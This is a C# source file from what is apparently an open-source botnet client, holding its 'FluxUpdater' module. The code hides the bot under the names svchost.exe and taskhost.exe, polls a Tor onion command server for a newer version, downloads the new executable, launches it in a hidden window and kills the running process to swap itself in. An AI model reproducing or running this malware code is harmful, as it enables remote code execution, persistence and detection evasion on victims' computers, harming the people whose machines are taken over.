using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace OpenSourceBotNet.Core.Helpers
{
    public class FluxUpdater
    {
        public FluxUpdater()
        {
            if (Application.ExecutablePath.ToString().Contains("taskhost.exe") == false && System.IO.File.Exists(Application.ExecutablePath.ToString().Replace("svchost.exe", "taskhost.exe")))
            {
                System.IO.File.Delete(Application.ExecutablePath.ToString().ToLower().Replace("svchost.exe", "taskhost.exe"));
            }

            if (Application.ExecutablePath.ToString().Contains("taskhost.exe"))
            {
                System.Threading.Thread.Sleep(120000);

                System.IO.File.Delete(Application.ExecutablePath.ToString().Replace("taskhost.exe", "svchost.exe"));
                System.IO.File.Copy(Application.ExecutablePath.ToString(), Application.ExecutablePath.ToString().Replace("taskhost.exe", "svchost.exe"));

                System.Diagnostics.Process p = new System.Diagnostics.Process();
                p.StartInfo = new System.Diagnostics.ProcessStartInfo(FluxGlobal.sInstallDirectory + "\\svchost.exe");
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.CreateNoWindow = true;
                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                p.Start();

                System.Diagnostics.Process.GetCurrentProcess().Kill();
            }
        }

        public void Start()
        {
            System.Threading.Thread.Sleep(120000);

            SocksWebClient wc = WebclientFactory.getWebClient();
            try
            {
                string updates = wc.DownloadString(FluxGlobal.sOnion + "api/bots/update.php");

                double dAvailable = double.Parse(updates);

                if (dAvailable > FluxGlobal.dVersion)
                {
                    try
                    {
                        wc.DownloadFile(FluxGlobal.sOnion + "api/bots/svchost.exe", FluxGlobal.sInstallDirectory + "\\taskhost.exe");

                        System.Diagnostics.Process p = new System.Diagnostics.Process();
                        p.StartInfo = new System.Diagnostics.ProcessStartInfo(FluxGlobal.sInstallDirectory + "\\taskhost.exe");
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.Start();

                        System.Diagnostics.Process.GetCurrentProcess().Kill();

                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }
    }
}

